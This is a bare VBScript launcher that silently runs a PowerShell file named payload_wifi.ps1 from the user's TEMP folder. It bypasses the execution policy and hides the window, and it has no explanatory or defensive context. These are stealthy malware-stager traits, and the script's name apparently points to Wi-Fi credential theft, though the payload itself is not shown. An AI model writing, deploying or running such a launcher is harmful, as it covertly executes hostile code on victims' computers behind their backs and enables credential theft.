Set sh = CreateObject("WScript.Shell")
tempPath = sh.ExpandEnvironmentStrings("%TEMP%")

sh.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPath & "\payload_wifi.ps1""", 0, False

